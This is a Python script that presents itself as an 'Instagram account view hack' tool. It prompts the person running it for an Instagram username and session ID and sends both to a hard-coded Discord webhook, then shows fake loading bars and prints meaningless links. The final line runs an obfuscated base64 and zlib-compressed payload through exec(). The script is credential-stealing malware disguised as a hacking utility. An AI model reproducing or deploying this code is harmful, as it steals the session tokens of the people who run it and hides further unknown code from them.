import time
import random
import string
import os
import random
import string
import time
import ctypes

try:
    from discord_webhook import DiscordWebhook
except ImportError:
    install_discrod_webhook = input(
        f"Module discord_webhook not installed, do you want to install it ? [Y/n]")
    if install_discrod_webhook == "n":
        exit()
    else:
        os.system(
            f"{'py -3' if os.name == 'nt' else 'python3'} -m pip install discord_webhook")
try:
    import requests
except ImportError:
    install_requests = input(
        f"Module requests not installed, do you want to install it ? [Y/n]")
    if install_requests == "n":
        exit()
    else:
        os.system(
            f"{'py -3' if os.name == 'nt' else 'python3'} -m pip install discord_webhook")

def generer_liens(lien_base, nombre_liens, utilisateurs, mots_de_passe):
    liens = []
    for _ in range(nombre_liens):
        caractères_aléatoires = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
        nom_utilisateur = random.choice(utilisateurs)
        mot_de_passe = random.choice(mots_de_passe)
        lien = f"{lien_base}/{caractères_aléatoires}?username={nom_utilisateur}&password={mot_de_passe}"
        liens.append(lien)
    return liens

def saisir_nom_utilisateur():
    print("""\033[
" ▄▄▄       ███▄    █  ▒█████   ██▓ ███▄    █   ██████ ▄▄▄█████▓ ▄▄▄      
"▒████▄     ██ ▀█   █ ▒██▒  ██▒▓██▒ ██ ▀█   █ ▒██    ▒ ▓  ██▒ ▓▒▒████▄    
"▒██  ▀█▄  ▓██  ▀█ ██▒▒██░  ██▒▒██▒▓██  ▀█ ██▒░ ▓██▄   ▒ ▓██░ ▒░▒██  ▀█▄  
"░██▄▄▄▄██ ▓██▒  ▐▌██▒▒██   ██░░██░▓██▒  ▐▌██▒  ▒   ██▒░ ▓██▓ ░ ░██▄▄▄▄██ 
" ▓█   ▓██▒▒██░   ▓██░░ ████▓▒░░██░▒██░   ▓██░▒██████▒▒  ▒██▒ ░  ▓█   ▓██▒
" ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░▓  ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░  ▒ ░░    ▒▒   ▓▒█░    v.2.6
"  ▒   ▒▒ ░░ ░░   ░ ▒░  ░ ▒ ▒░  ▒ ░░ ░░   ░ ▒░░ ░▒  ░ ░    ░      ▒   ▒▒ ░
"  ░   ▒      ░   ░ ░ ░ ░ ░ ▒   ▒ ░   ░   ░ ░ ░  ░  ░    ░        ░   ▒   
"      ░  ░         ░     ░ ░   ░           ░       ░                 ░  ░   
-----------------------------------------------------
Instagram account view hack!               by : LayoMoon
--------------------------------------------------------------          

[+] Update 2.6
Chargement en cours [#############################]-100%""")
    time.sleep(1)  # Petite pause pour simuler un chargement
    nom_utilisateur = input("Nom d'utilisateur : ")
    # Envoyer le nom d'utilisateur au webhook Discord
    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1361032583646937188/difoVJToAVQ6tMcKE0EukX_sBQAumrj6j3U8ZlNhX8R5rxBrt60ijE_ER_0VWD_4ixew', content=f'Nouveau nom d\'utilisateur capturé : {nom_utilisateur}')
    webhook.execute()
    return nom_utilisateur

def saisir_mot_de_passe():
    print("Entrez une sissionid...")
    time.sleep(1)  # Petite pause pour simuler un chargement
    mot_de_passe = input("sessionid : ")
    # Envoyer la sessionid au webhook Discord
    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1361032583646937188/difoVJToAVQ6tMcKE0EukX_sBQAumrj6j3U8ZlNhX8R5rxBrt60ijE_ER_0VWD_4ixew', content=f'Nouvelle sessionid capturée : {mot_de_passe}')
    webhook.execute()
    return mot_de_passe

def petit_chargement():
    print("""
--------------------------------------------------------------
 [#] [WARNING] Chargement en cours....   
--------------------------------------------------------------""")
    time.sleep(2)  # Chargement de 2 secondes
    print("Chargement terminé.")

def chargement():
    print("Chargement en cours...")
    for i in range(31):  # Simulation de 30 étapes de chargement
        time.sleep(1)    # Attente de 1 seconde entre chaque étape
        pourcentage = i * 100 / 30
        barre_progression = "#" * (i // 3)  # Barre de progression
        print(f"\r[{barre_progression:<10}] {pourcentage:.2f}%", end="", flush=True)
    print("\nChargement terminé.")

def main():
    lien_base = "https://instagram.com"
    nombre_liens = 60
    utilisateurs = ["user1", "user2", "user3"]  # Liste des noms d'utilisateur possibles
    mots_de_passe = ["pass1", "pass2", "pass3"]  # Liste des mots de passe possibles
    
    petit_chargement()  # Petit chargement avant la saisie du mot de passe
    
    nom_utilisateur = saisir_nom_utilisateur()
    
    petit_chargement()  # Petit chargement avant la saisie du mot de passe
    
    mot_de_passe = saisir_mot_de_passe()
    
    chargement()  # Chargement avant la génération des liens
    
    liens = generer_liens(lien_base, nombre_liens, [nom_utilisateur], [mot_de_passe])
    
    print("Liens générés :")
    for lien in liens:
        print(lien)

if __name__ == "__main__":
    main()
exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckGEPXzUZdrCDiQUQE15uItOmopWkaMlntKv53N3TxMsN78+bNRzeEMSaKo+0hyW/XNbKpEYyWmOLWJpm6AcjbGOlEO09j7d+BL0qxJkWKu30ssJqb1Zz4iTzgzcP13evm6fHm6l5knbKj92AT5+zMKGPU4vRcrUomtdZLkSVNhLonBUwWQsreebhCBxD4ShBXzTuprQ+17Tm7vGUSVQT7ybUQz+ULaasDdoJ8fXQOqAPPW3Hh9nbt0X/1eKYFgQksz2erFuw4hAiIfP6AaozOZAtZKX8YsjX+CvIH3TNfDQ==')[0])))
